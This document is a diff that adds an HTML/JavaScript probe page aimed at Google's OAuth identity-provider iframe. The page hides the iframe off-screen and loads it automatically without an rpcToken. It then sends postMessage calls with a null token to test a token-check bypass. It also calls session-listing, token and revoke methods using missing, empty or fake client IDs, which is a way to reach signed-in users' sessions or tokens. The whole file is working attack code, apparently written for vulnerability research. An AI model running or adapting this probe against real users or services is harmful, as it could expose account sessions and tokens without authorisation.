@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<!--
+  IdP iframe probe — no client_id required
+  =========================================
+  Tests two things:
+
+  1. NULL-NULL rpcToken bypass:
+     Normal: parent loads iframe with #rpcToken=SECRET, stores it, validates
+             incoming messages against it.
+     Attack: load iframe with NO #rpcToken → this.rpcToken = null/undefined.
+             Send rpcToken:null in message → null === null → bypass.
+             Means any page can call the iframe without knowing the rpcToken.
+
+  2. No-clientId method access:
+     listIdpSessions validator (Gb): requires clientId (truthy).
+     monitorClient / revoke: may or may not require clientId.
+     Test: send without clientId, with empty string, with random string.
+     If server-side doesn't validate the clientId value, we may get results.
+
+  Wire format: JSON STRING (not object) posted to accounts.google.com.
+  {rpcToken, method, id, params} — all as a stringified JSON.
+-->
+<html>
+<head>
+<title>IdP iframe — no-client_id probe</title>
+<style>
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { font-family:monospace; background:#111; color:#ccc; padding:14px; font-size:13px; }
+  h2 { color:#fc0; margin-bottom:8px; }
+  .box { background:#1a1a1a; border:1px solid #333; padding:10px; border-radius:4px; margin-bottom:8px; }
+  #log { background:#000; border:1px solid #222; padding:8px; height:380px; overflow-y:auto; font-size:11px; }
+  .lo{color:#555;} .hi{color:#fc0;} .ok{color:#0c0;} .er{color:#f55;} .in{color:#7df;}
+  button { background:#222; color:#ccc; border:1px solid #444; padding:4px 10px;
+           cursor:pointer; border-radius:3px; margin:2px; font-family:monospace; font-size:12px; }
+  button:hover { background:#333; }
+  iframe { position:absolute; top:-9999px; width:1px; height:1px; border:none; }
+  .stat { display:inline-block; padding:3px 8px; border-radius:3px; margin:2px;
+          font-size:11px; background:#1a1a1a; border:1px solid #333; }
+  .WAIT{border-color:#444;color:#555;} .OK{border-color:#0c0;color:#0c0;}
+  .FAIL{border-color:#f55;color:#f55;} .INFO{border-color:#7df;color:#7df;}
+</style>
+</head>
+<body>
+<h2>IdP iframe — null-token + no-client_id probe</h2>
+
+<div class="box">
+  <span class="stat WAIT" id="s_load">iframe: WAITING</span>
+  <span class="stat WAIT" id="s_ready">idpReady: WAITING</span>
+  <span class="stat WAIT" id="s_cookie">cookieDisabled: ?</span>
+  <span class="stat WAIT" id="s_token">rpcToken bypass: ?</span>
+</div>
+
+<div class="box">
+  <button onclick="loadNull()">1. Load (no rpcToken in hash)</button>
+  <button onclick="loadWithToken()">1b. Load (with rpcToken — control)</button>
+  &nbsp;&nbsp;
+  <button onclick="probeMethods()">2. Probe all methods (no clientId)</button>
+  <button onclick="probeEmptyCid()">3. Probe with clientId:""</button>
+  <button onclick="probeRandomCid()">4. Probe with random clientId</button>
+</div>
+
+<div id="log"></div>
+
+<iframe id="idp_frame" name="idp_frame"></iframe>
+
+<script>
+var T0 = Date.now();
+var IDP_ORIGIN = 'https://accounts.google.com';
+var SELF = location.origin;
+var reqId = 0;
+var pending = {};
+var idpReadyFired = false;
+var activeToken = null;  // what rpcToken we sent in hash
+
+function log(msg, cls) {
+  var el = document.getElementById('log');
+  var t = ((Date.now()-T0)/1000).toFixed(2);
+  el.innerHTML += '<span class="'+(cls||'lo')+'">['+t+'s] '+esc(msg)+'</span>\n';
+  el.scrollTop = el.scrollHeight;
+}
+function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function stat(id, cls, txt) { var e=document.getElementById(id); e.className='stat '+cls; e.textContent=txt; }
+
+// ── Send to iframe ────────────────────────────────────────────────────────────
+// IMPORTANT: must stringify — iframe expects JSON string, not object
+function send(method, params, rpcTokenOverride) {
+  var id = 'r' + (++reqId);
+  var token = (rpcTokenOverride !== undefined) ? rpcTokenOverride : null;
+  var msg = JSON.stringify({
+    rpcToken: token,
+    method:   method,
+    id:       id,
+    params:   params || {}
+  });
+  document.getElementById('idp_frame').contentWindow.postMessage(msg, IDP_ORIGIN);
+  log('→ [rpcToken=' + JSON.stringify(token) + '] ' + method +
+      ' params=' + JSON.stringify(params || {}).slice(0, 120), 'lo');
+  return id;
+}
+
+function sendTracked(method, params, label) {
+  var id = send(method, params);
+  pending[id] = label || method;
+  return id;
+}
+
+// ── Message handler ───────────────────────────────────────────────────────────
+window.addEventListener('message', function(ev) {
+  if (ev.origin !== IDP_ORIGIN) return;
+  var raw = ev.data;
+  var str = typeof raw === 'string' ? raw : JSON.stringify(raw);
+
+  log('← [raw]: ' + str.slice(0, 400), 'in');
+
+  var d;
+  try { d = typeof raw === 'object' ? raw : JSON.parse(raw); } catch(e) { return; }
+  if (!d) return;
+
+  // idpReady — iframe accepted us as trusted parent
+  if (d.method === 'fireIdpEvent' && d.params && d.params.type === 'idpReady') {
+    idpReadyFired = true;
+    var cd = d.params.cookieDisabled;
+    log('IDP READY — cookieDisabled=' + cd, cd ? 'er' : 'ok');
+    stat('s_ready', 'OK', 'idpReady ✓');
+    stat('s_cookie', cd ? 'FAIL' : 'OK',
+         'cookieDisabled=' + cd + (cd ? ' (SAPISID blocked)' : ' (cookies reach iframe!)'));
+
+    // KEY: if idpReady fired, our null-rpcToken message was accepted.
+    // The origin check passed (ev.origin===this.j from hash).
+    // rpcToken check: this.rpcToken===null if we loaded without #rpcToken.
+    // idpReady is sent BY the iframe (not a response to us), so it fires
+    // regardless of our token. The real test is whether our METHOD CALLS get responses.
+    if (activeToken === null) {
+      log('NULL rpcToken test: iframe fired idpReady. Now probing methods with rpcToken:null...', 'hi');
+      stat('s_token', 'INFO', 'idpReady w/ null token — method responses will confirm bypass');
+    }
+    return;
+  }
+
+  // Response to our calls
+  if (d.id) {
+    var label = pending[d.id] || d.id;
+    delete pending[d.id];
+
+    if (d.error !== undefined) {
+      log('RESPONSE ' + label + ' → ERROR: ' + JSON.stringify(d.error), 'er');
+      // Classify the error
+      if (d.error === 'bad_request') {
+        log('  bad_request = clientId/scope validator rejected us at JS level', 'er');
+        stat('s_token', 'INFO', 'bypass partial: idpReady ✓, method hit validator (bad_request)');
+      } else if (d.error === 'user_logged_out') {
+        log('  user_logged_out = SAPISID reached server but no valid session', 'ok');
+      } else if (d.error === 'origin_mismatch') {
+        log('  origin_mismatch = rpcToken check FAILED — bypass did NOT work', 'er');
+        stat('s_token', 'FAIL', 'rpcToken check failed — null bypass closed');
+      } else {
+        log('  error_subtype: ' + JSON.stringify(d.error_subtype), 'lo');
+      }
+    } else if (d.result !== undefined) {
+      log('RESPONSE ' + label + ' → RESULT: ' + JSON.stringify(d.result).slice(0, 300), 'ok');
+      stat('s_token', 'OK', 'METHOD RESPONSE RECEIVED — null-token bypass confirmed!');
+    } else {
+      log('RESPONSE ' + label + ' (no result/error): ' + JSON.stringify(d).slice(0,200), 'lo');
+    }
+    return;
+  }
+
+  log('OTHER msg: ' + str.slice(0,200), 'lo');
+}, false);
+
+// ── Load functions ────────────────────────────────────────────────────────────
+
+function loadNull() {
+  // No rpcToken in hash → iframe's this.rpcToken = null/undefined
+  // We will send rpcToken:null → null===null should bypass
+  idpReadyFired = false;
+  activeToken = null;
+  var url = IDP_ORIGIN + '/o/oauth2/iframe#origin=' + encodeURIComponent(SELF);
+  log('Loading with NO rpcToken in hash: ' + url, 'hi');
+  log('Hypothesis: iframe.rpcToken=null, our send rpcToken:null → null===null bypass', 'hi');
+  stat('s_load', 'INFO', 'loading (no rpcToken)...');
+  var fr = document.getElementById('idp_frame');
+  fr.onload = function() {
+    log('onload fired', 'ok');
+    stat('s_load', 'OK', 'iframe loaded ✓');
+  };
+  fr.src = url;
+}
+
+function loadWithToken() {
+  // Control: normal token — confirms the non-bypass path works
+  idpReadyFired = false;
+  activeToken = 'ctrl_' + Math.random().toString(36).slice(2);
+  var url = IDP_ORIGIN + '/o/oauth2/iframe' +
+            '#origin=' + encodeURIComponent(SELF) +
+            '&rpcToken=' + encodeURIComponent(activeToken);
+  log('Loading WITH rpcToken=' + activeToken + ' (control)', 'hi');
+  stat('s_load', 'INFO', 'loading (with rpcToken)...');
+  var fr = document.getElementById('idp_frame');
+  fr.onload = function() { stat('s_load', 'OK', 'iframe loaded ✓'); };
+  fr.src = url;
+}
+
+// ── Method probes ─────────────────────────────────────────────────────────────
+
+function probeMethods() {
+  if (!idpReadyFired) { log('wait for idpReady first', 'er'); return; }
+  log('=== PROBE: no clientId ===', 'hi');
+
+  // listIdpSessions without clientId — validator Gb requires clientId
+  // Testing: what error do we get? bad_request (JS gate) or server error?
+  sendTracked('listIdpSessions', {
+    request: { scope: 'openid email profile' }
+  }, 'listIdpSessions(no-cid)');
+
+  // monitorClient without clientId
+  sendTracked('monitorClient', {
+    useFedCm: false
+  }, 'monitorClient(no-cid)');
+
+  // revoke without arguments — what happens?
+  sendTracked('revoke', {}, 'revoke(no-args)');
+
+  // sessionState / getSessionState guesses
+  sendTracked('getSessionState', {}, 'getSessionState(no-cid)');
+  sendTracked('sessionState',    {}, 'sessionState(no-cid)');
+}
+
+function probeEmptyCid() {
+  if (!idpReadyFired) { log('wait for idpReady first', 'er'); return; }
+  log('=== PROBE: clientId="" ===', 'hi');
+
+  sendTracked('listIdpSessions', {
+    clientId: '',
+    request: { client_id: '', scope: 'openid email profile' }
+  }, 'listIdpSessions(cid="")');
+
+  sendTracked('getTokenResponse', {
+    clientId: '',
+    request: { client_id: '', scope: 'openid email', response_type: 'token' }
+  }, 'getTokenResponse(cid="")');
+
+  sendTracked('monitorClient', {
+    clientId: '',
+    useFedCm: false
+  }, 'monitorClient(cid="")');
+}
+
+function probeRandomCid() {
+  if (!idpReadyFired) { log('wait for idpReady first', 'er'); return; }
+  var fakeCid = Math.floor(Math.random()*1e12) + '-fake.apps.googleusercontent.com';
+  log('=== PROBE: random clientId=' + fakeCid + ' ===', 'hi');
+
+  sendTracked('listIdpSessions', {
+    clientId: fakeCid,
+    request: { client_id: fakeCid, scope: 'openid email profile' }
+  }, 'listIdpSessions(rand-cid)');
+
+  sendTracked('getTokenResponse', {
+    clientId: fakeCid,
+    loginHint: '',
+    request: { client_id: fakeCid, scope: 'openid email', response_type: 'token' }
+  }, 'getTokenResponse(rand-cid)');
+}
+
+// Auto-load on page ready
+window.addEventListener('load', function() {
+  setTimeout(loadNull, 200);
+});
+</script>
+</body>
+</html>
